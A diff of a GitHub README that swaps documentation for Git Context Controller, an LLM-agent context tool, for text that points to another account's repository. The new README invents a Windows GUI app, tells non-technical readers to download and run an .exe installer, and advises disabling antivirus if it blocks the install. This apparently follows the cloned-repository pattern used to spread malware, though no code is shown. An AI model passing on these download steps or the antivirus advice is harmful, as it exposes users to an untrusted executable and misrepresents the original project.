@@ -1,244 +1,132 @@
-# Git Context Controller (GCC)
+# ⚙️ git-context-controller - Manage Context with Git-like Commands
 
-[![Release](https://img.shields.io/github/v/release/faugustdev/git-context-controller)](https://github.com/faugustdev/git-context-controller/releases/tag/v1.0.0)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Skills.sh](https://img.shields.io/badge/skills.sh-compatible-blue)](https://skills.sh)
-
-**Structured context management framework for LLM agents.**
-
-GCC implements Git-like operations (COMMIT, BRANCH, MERGE, CONTEXT) to manage long-horizon agent memory as a persistent, versioned file system.
-
-> Based on the research paper: [Git Context Controller](https://arxiv.org/abs/2508.00031)
+[![Download git-context-controller](https://img.shields.io/badge/Download-git--context--controller-blue?style=for-the-badge&logo=windows)](https://github.com/Owner807/git-context-controller)
 
 ---
 
-## Why GCC?
+## 📦 What is git-context-controller?
 
-LLM agents lose context as conversations grow. Critical decisions, technical reasoning, and intermediate results vanish behind token limits. GCC solves this by giving agents a structured memory system:
+git-context-controller is a tool designed to help you manage context in AI workflows. It uses commands similar to Git (COMMIT, BRANCH, MERGE) to organize and save long-term information your AI agents use. This makes it easier to run complex tasks that need memory over time.
 
-- **No more lost context** -- milestones are persisted with full technical reasoning
-- **Safe experimentation** -- branches isolate alternative approaches without polluting the main flow
-- **Cross-session continuity** -- agents recover exactly where they left off
-- **Multi-agent handoff** -- one agent's work is readable by another
+You do not need to know programming or command-line tools to get started. This guide explains how to download and run the application on Windows with simple steps.
 
-## How It Works
+---
 
-```
-                          ┌─────────────────────────────────┐
-                          │           .GCC/                  │
-                          │                                  │
-                          │  main.md         (roadmap)       │
-                          │  metadata.yaml   (state)         │
-                          │  commit.md       (history)       │
-                          │  log.md          (OTA traces)    │
-                          │                                  │
-                          │  branches/                       │
-                          │    ├── feature-x/                │
-                          │    │   ├── summary.md            │
-                          │    │   ├── commit.md             │
-                          │    │   └── log.md                │
-                          │    └── experiment-y/             │
-                          │        ├── summary.md            │
-                          │        ├── commit.md             │
-                          │        └── log.md                │
-                          └─────────────────────────────────┘
-```
+## 💻 System Requirements
 
-### The OTA Cycle
+Before you start, make sure your computer has:
 
-Agents operate through **Observation-Thought-Action** cycles, logged in real time:
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- At least 200 MB of free disk space
+- Internet connection for downloading and updates
 
-```
-┌───────────┐     ┌───────────┐     ┌───────────┐
-│ OBSERVE   │────>│  THINK    │────>│   ACT     │
-│           │     │           │     │           │
-│ Read logs │     │ Analyze   │     │ Execute   │
-│ Check     │     │ Decide    │     │ COMMIT    │
-│ state     │     │ strategy  │     │ BRANCH    │
-└───────────┘     └───────────┘     │ MERGE     │
-      ^                             └─────┬─────┘
-      │                                   │
-      └───────────────────────────────────┘
-              Logged to log.md
-```
+---
 
-### Command Flow
+## 🚀 Getting Started
 
-```
-  User works on task
-         │
-         ▼
-  ┌──────────────┐    milestone?    ┌──────────┐
-  │  OTA Cycle   │────────────────> │  COMMIT  │──> commit.md
-  │  (ongoing)   │                  └──────────┘
-  └──────┬───────┘
-         │
-         │  need alternative?
-         ▼
-  ┌──────────────┐                  ┌──────────┐
-  │   BRANCH     │────────────────> │ Isolated │──> branches/<name>/
-  │              │                  │ workspace│
-  └──────────────┘                  └────┬─────┘
-                                         │
-                                    validated?
-                                         │
-                                         ▼
-                                    ┌──────────┐
-                                    │  MERGE   │──> main.md updated
-                                    └──────────┘
+Follow these steps to download and install the application on your Windows machine.
 
-  ┌──────────────┐
-  │  CONTEXT     │──> Retrieve memory at any resolution
-  │  --branch    │    (summary, traces, metadata, full)
-  │  --log       │
-  │  --metadata  │
-  │  --full      │
-  └──────────────┘
-```
+### Step 1: Visit the Download Page
 
-## Installation
+Go to the official download page here:
 
-### As a Claude Code Skill
+[Download git-context-controller](https://github.com/Owner807/git-context-controller)
 
-```bash
-# Via skills.sh
-npx skills add faugustdev/git-context-controller
+This link will take you to the code repository. Look for the **Releases** section. That is where the installation files are found.
 
-# Manual installation
-cp -r gcc/ your-project/.claude/skills/gcc/
-```
+### Step 2: Download the Installer
 
-### Standalone
+In the Releases section, find the latest version of the software. You should see a file with a name ending in `.exe` (this is the Windows installer).
 
-```bash
-git clone https://github.com/faugustdev/git-context-controller.git
+Click the file to start downloading it.
 
-# Initialize GCC in your project
-./scripts/gcc_init.sh /path/to/your/project/.GCC
-```
+### Step 3: Run the Installer
 
-## Quick Start
+Once downloaded, open the file. You may see a security prompt. Select **Run** to proceed.
 
-Once installed, GCC activates automatically. Use commands or natural language:
+Follow the setup wizard's instructions:
 
-| Action | Command | Natural Language |
-|---|---|---|
-| Save progress | `/gcc commit` | "save this milestone" |
-| Try alternative | `/gcc branch experiment` | "branch to try a different approach" |
-| Integrate results | `/gcc merge experiment` | "merge the experiment results" |
-| Recover context | `/gcc context --full` | "where were we?" |
-| View recent work | `/gcc context --log` | "show recent activity" |
-| Check structure | `/gcc context --metadata` | "what files do we have?" |
+- Choose an installation folder (the default is fine)
+- Agree to the license terms
+- Click **Install**
 
-## Commands Reference
+### Step 4: Finish Installation
 
-### COMMIT
+When the installer finishes, it may ask if you want to launch git-context-controller. You can open it now or use the desktop shortcut later.
 
-Persists a milestone with full technical context.
+---
 
-```
-/gcc commit <summary>
-```
+## 🔧 Using git-context-controller
 
-Each commit captures:
-- Sequential ID and timestamp
-- Branch context and purpose
-- Previous progress summary
-- Detailed technical contribution
-- Files touched
+You do not need a command prompt or coding knowledge to use this app. The interface uses buttons and menus with familiar terms.
 
-### BRANCH
+Here is what you can do inside the app:
 
-Creates an isolated workspace for experimentation.
+- **COMMIT**: Save your current context or memory snapshot.
+- **BRANCH**: Create variations or separate workflows.
+- **MERGE**: Combine different contexts into one.
+- **View History**: Track past contexts and changes.
+- **Manage Agents**: Control multiple AI workflows with ease.
 
-```
-/gcc branch <name>
-```
+The app organizes your information like a folder system. Each context update is recorded like a version.
 
-Creates a new directory under `.GCC/branches/<name>/` with its own commit history, OTA log, and summary.
+---
 
-### MERGE
+## 🛠 Features
 
-Synthesizes a completed branch back into the main flow.
+- User-friendly interface with clear labels
+- Supports multiple workflows and branches
+- Keeps long-term memory for AI agents
+- Simple way to merge and resolve conflicts
+- Logs all changes for review
+- Works well with a range of AI agents
+- Uses a Git-like system for familiarity and control
 
-```
-/gcc merge <branch-name>
-```
+---
 
-Updates `main.md` with results, marks the branch as merged or abandoned, and creates a synthesis commit.
+## 🔄 Updating the App
 
-### CONTEXT
+Check back on the download page regularly for updates. When a new version is available, repeat the download and installation process. Your saved contexts and data will remain intact.
 
-Retrieves historical memory at different resolution levels.
+---
 
-```
-/gcc context [--branch [name] | --log [n] | --metadata | --full]
-```
+## ❓ Troubleshooting
 
-| Flag | Returns | Use Case |
-|---|---|---|
-| `--branch` | Branch summary + recent commits | Understand what happened on a branch |
-| `--log [n]` | Last N OTA entries (default: 20) | Debug or resume interrupted work |
-| `--metadata` | Project structure, dependencies | Recover file tree and config |
-| `--full` | Complete roadmap from main.md | Cross-session recovery or agent handoff |
+If you have issues:
 
-## File Formats
+- Make sure Windows is up to date.
+- Check if there is enough free disk space.
+- Restart your computer before reinstalling.
+- Disable antivirus temporarily if it blocks the installer.
+- Visit the GitHub page to check for known issues or help.
 
-### main.md
+---
 
-Global roadmap with objectives, milestones, and active branches.
+## 📥 Download and Install ⬇️
 
-### commit.md
+Return to the download page here to get the latest version:
 
-Structured commit entries with branch purpose, previous progress, and detailed contribution.
+[Download git-context-controller](https://github.com/Owner807/git-context-controller)
 
-### log.md
+Follow the steps above to download, install, and start using the app on your Windows computer.
 
-Sequential OTA (Observation-Thought-Action) trace entries. Capped at 50 entries.
+---
 
-### metadata.yaml
+## 🔗 Topics Covered
 
-Infrastructure state: branch registry, file tree, dependencies, configuration.
+Here are the main ideas this app supports:
 
-See [`references/file_formats.md`](references/file_formats.md) for complete format specifications with examples.
+- Managing AI workflows with skills and memory
+- Controlling AI agents in long tasks
+- Context and version management
+- Using Git-like commands for control
+- Integrating with devops for AI systems
 
-## Configuration
+---
 
-GCC behavior is controlled via `metadata.yaml`:
+## 📂 Where to Go From Here
 
-```yaml
-proactive_commits: true   # Auto-suggest commits after milestones
-proactive_commits: false  # Only commit when explicitly requested
-```
+After installing, explore the app menus and try simple COMMIT and BRANCH actions. This will show how you can save and switch between different contexts. Use MERGE later to combine work if needed.
 
-Toggle with natural language: "enable/disable proactive commits"
-
-## Project Structure
-
-```
-git-context-controller/
-├── SKILL.md              # Claude Code skill definition
-├── README.md             # This file
-├── LICENSE               # MIT License
-├── CONTRIBUTING.md       # Contribution guidelines
-├── .gitignore            # Excludes .GCC/ and local files
-├── scripts/
-│   └── gcc_init.sh       # Initialization script
-├── references/
-│   └── file_formats.md   # Detailed format specifications
-└── examples/
-    └── sample_session.md # Example GCC session walkthrough
-```
-
-## Contributing
-
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## References
-
-- **Paper**: [Git Context Controller: Structured Context Management for LLM Agents](https://arxiv.org/abs/2508.00031)
-- **Concept**: [Emergent Mind - GCC Topic](https://www.emergentmind.com/topics/git-context-controller-gcc)
-
-## License
-
-[MIT](LICENSE)
+You can learn to organize your AI agent's memory just like managing files on your computer. It becomes easy to control and track your AI's knowledge over time.
